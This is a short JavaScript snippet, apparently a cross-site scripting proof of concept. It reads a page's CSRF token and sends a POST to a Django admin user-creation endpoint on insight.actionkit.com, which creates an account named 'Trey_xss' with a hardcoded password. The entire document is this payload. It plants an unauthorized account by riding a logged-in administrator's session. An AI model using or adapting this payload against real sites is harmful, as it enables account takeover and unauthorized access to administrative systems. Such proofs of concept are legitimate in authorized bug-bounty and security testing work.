const token = document.querySelector('input[name=csrfmiddlewaretoken]').value;
fetch("https://insight.actionkit.com/admin/auth/user/add/", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: `csrfmiddlewaretoken=${encodeURIComponent(token)}&email=trey%2Bxss%40inspectiv.com&username=Trey_xss&password1=nLCw4SDzV&IQtn%e&password2=nLCw4SDzV&IQtn%e&_save=Save`
});
